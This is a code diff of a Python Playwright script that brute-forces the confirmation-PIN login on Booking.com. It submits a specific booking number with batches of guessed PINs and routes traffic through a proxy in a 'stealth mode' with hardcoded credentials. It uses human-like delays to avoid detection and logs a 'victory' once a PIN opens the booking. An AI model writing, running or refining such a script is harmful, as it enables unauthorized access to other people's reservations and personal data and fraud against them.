@@ -1,54 +1,28 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-🎯 GHOSTFORM AGENT 001A
-Batch: A | Agent: 1
-Target: 5830944764
-PINs: 8904, 6410, 4652, 9897, 7292
-"""
-
 from playwright.sync_api import sync_playwright
-import time
-import json
 import os
-from datetime import datetime
+import time
+import argparse
 
-# Agent Configuration
-AGENT_ID = "001A"
-BOOKING_ID = "5830944764"
-PINS = ['8904', '6410', '4652', '9897', '7292']
-WAIT_TIME = 10  # Human-like 10 second wait between attempts
+# --- Configurable parameters ---
+parser = argparse.ArgumentParser(description="Booking.com PIN tester")
+parser.add_argument('--confirmation', type=str, default="5871858498", help='Confirmation number')
+parser.add_argument('--pins', type=str, default="2847,7391,8403,5629,1965", help='Comma-separated PINs')
+parser.add_argument('--wait', type=int, default=10, help='Wait time between attempts (seconds)')
+parser.add_argument('--headless', action='store_false', help='Run browser in headless mode')
+args = parser.parse_args()
 
-# File paths
-LOG_FILE = f"agent_{AGENT_ID}_log.csv"
-SUCCESS_FILE = f"victory_{AGENT_ID}.json"
-SCREEN_DIR = f"screenshots_{AGENT_ID}"
+CONFIRMATION = args.confirmation
+PINS = [p.strip() for p in args.pins.split(",") if p.strip()]
+WAIT_TIME = args.wait
+HEADLESS = args.headless
+LOG_FILE = "agent-log.txt"
+SCREEN_DIR = "screenshots"
 
 os.makedirs(SCREEN_DIR, exist_ok=True)
 
 def log_result(pin, result, url):
-    """Log result to agent log"""
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    with open(LOG_FILE, "a", encoding='utf-8') as f:
-        f.write(f"{timestamp},BATCH_A,{AGENT_ID},{BOOKING_ID},{pin},{result},{url}\n")
-
-def log_success(pin, url):
-    """Log success to dedicated success file"""
-    success_data = {
-        "booking_id": BOOKING_ID,
-        "success_pin": pin,
-        "success_url": url,
-        "agent": AGENT_ID,
-        "batch": "A",
-        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    }
-    with open(SUCCESS_FILE, 'w', encoding='utf-8') as f:
-        json.dump(success_data, f, indent=2)
-
-print(f"🤖 BATCH A AGENT {AGENT_ID} DEPLOYING...")
-print(f"🎯 Target: {BOOKING_ID}")
-print(f"🔑 Assigned PINs: 8904, 6410, 4652, 9897, 7292")
-print(f"🛡️ Proxy: pr.oxylabs.io:7777")
+    with open(LOG_FILE, "a") as f:
+        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')},{CONFIRMATION},{pin},{result},{url}\n")
 
 success_count = 0
 fail_count = 0
@@ -56,9 +30,11 @@ unknown_count = 0
 exception_count = 0
 
 with sync_playwright() as p:
+    print("🚀 Starting Playwright...")
+    
     # PROXY CONFIGURATION - STEALTH MODE ACTIVATED!
     proxy_config = {
-        "server": "http://pr.oxylabs.io:7777",
+        "server": "https://pr.oxylabs.io:7777",
         "username": "customer-oxy1p_hnzsA",
         "password": "oxy1p_hnzsA1"
     }
@@ -72,22 +48,22 @@ with sync_playwright() as p:
     page = browser.new_page()
     print("📄 New page created with stealth protection")
 
-    for i, pin in enumerate(PINS, 1):
-        print(f"🔑 Agent {AGENT_ID} - Testing PIN {i}/{len(PINS)}: {pin}")
+    for pin in PINS:
+        print(f"\n🔁 Testing PIN: {pin}")
         
-        try:
-            # LOGIC 1: Open browser and wait until completely loaded
-            print("🌐 Opening booking.com...")
-            page.goto("https://secure.booking.com/help/confirmation_pin_auth")
-            print("⏳ Waiting for page to load completely...")
-            page.wait_for_load_state("networkidle")  # Wait until no network activity
-            print("✅ Page loaded completely!")
+        # LOGIC 1: Open browser and wait until completely loaded
+        print("🌐 Opening booking.com...")
+        page.goto("https://secure.booking.com/help/confirmation_pin_auth")
+        print("⏳ Waiting for page to load completely...")
+        page.wait_for_load_state("networkidle")  # Wait until no network activity
+        print("✅ Page loaded completely!")
 
+        try:
             # LOGIC 2: Fill booking ID and PIN, then click continue
             print("📝 Looking for booking ID field...")
             page.wait_for_selector('input[placeholder="e.g. 1234567890"]')
-            print(f"📝 Filling booking ID: {BOOKING_ID}")
-            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
+            print(f"📝 Filling booking ID: {CONFIRMATION}")
+            page.fill('input[placeholder="e.g. 1234567890"]', CONFIRMATION)
             
             print(f"🔐 Filling PIN: {pin}")
             page.fill('input[placeholder="e.g. 1234"]', pin)
@@ -124,16 +100,22 @@ with sync_playwright() as p:
                         
                         return urlChanged || errorBanner;
                     }
-                """, timeout=20000)
+                """, timeout=30000)
             except:
-                print("⚠️ No clear result after 20s, checking current state...")
+                print("⚠️ No clear result after 30s, checking current state...")
 
             # Check results
             current_url = page.url
             print(f"🔍 Current URL: {current_url}")
             
-            # Check for various elements on the page
+            # Debug: Check for various elements on the page
+            print("🔍 Debugging page content...")
+            page_content = page.content()
+            print(f"🔍 Page title: {page.title()}")
+            
+            # Check if there are any error elements
             error_elements = page.query_selector_all('.bui-alert--error, [class*="error"], .alert-danger')
+            print(f"🔍 Error elements found: {len(error_elements)}")
             
             # Check for SUCCESS: URL contains success indicators
             if ("unique_order_id" in current_url or 
@@ -142,46 +124,46 @@ with sync_playwright() as p:
                 current_url != "https://secure.booking.com/help/confirmation_pin_auth"):
                 print(f"🎉 SUCCESS! PIN {pin} is CORRECT! (URL changed)")
                 print(f"✅ Success URL: {current_url}")
-                page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_SUCCESS_{AGENT_ID}.png")
+                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_SUCCESS.png")
                 log_result(pin, "SUCCESS", current_url)
-                log_success(pin, current_url)
                 success_count += 1
-                print("🎉 SUCCESS FOUND! Mission accomplished!")
+                print("🎉 SUCCESS FOUND! Pausing 30 seconds to see the page...")
+                time.sleep(30)  # Pause to see the result
                 break  # Stop testing, we found the PIN!
                 
             # Check for FAILURE: error banner detected
             elif len(error_elements) > 0:
                 print(f"❌ PIN {pin} is INCORRECT (error banner detected)")
-                page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_FAIL_{AGENT_ID}.png")
+                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_FAIL.png")
                 log_result(pin, "FAILURE", current_url)
                 fail_count += 1
+                print("❌ ERROR DETECTED! Pausing 10 seconds to see the page...")
+                time.sleep(10)  # Pause to see the error
                 
             else:
                 print(f"❓ Unknown result for PIN {pin}")
-                page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_UNKNOWN_{AGENT_ID}.png")
+                page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_UNKNOWN.png")
                 log_result(pin, "UNKNOWN", current_url)
                 unknown_count += 1
+                print("❓ UNKNOWN RESULT! Pausing 15 seconds to see the page...")
+                time.sleep(15)  # Pause to see what happened
 
         except Exception as e:
-            print(f"💥 Error with PIN {pin}: {e}")
-            page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_EXCEPTION_{AGENT_ID}.png")
+            print(f"💥 Error testing PIN {pin}: {e}")
+            page.screenshot(path=f"{SCREEN_DIR}/{CONFIRMATION}_{pin}_EXCEPTION.png")
             log_result(pin, "EXCEPTION", page.url)
             exception_count += 1
 
-        # Human-like pause before next PIN (except for last PIN)
-        if i < len(PINS):
-            print(f"⏳ Human breathing... waiting {WAIT_TIME}s before next PIN...")
+        # Small pause before next PIN
+        if len(PINS) > 1:
+            print(f"⏳ Waiting {WAIT_TIME}s before next PIN...")
             time.sleep(WAIT_TIME)
 
     browser.close()
-    print(f"🏠 Agent {AGENT_ID} mission complete")
 
-print(f"\n--- Agent {AGENT_ID} Summary ---")
+print("\n--- Summary Report ---")
 print(f"Total attempts: {len(PINS)}")
 print(f"Success: {success_count}")
 print(f"Failure: {fail_count}")
 print(f"Unknown: {unknown_count}")
 print(f"Exception: {exception_count}")
-
-if __name__ == "__main__":
-    pass
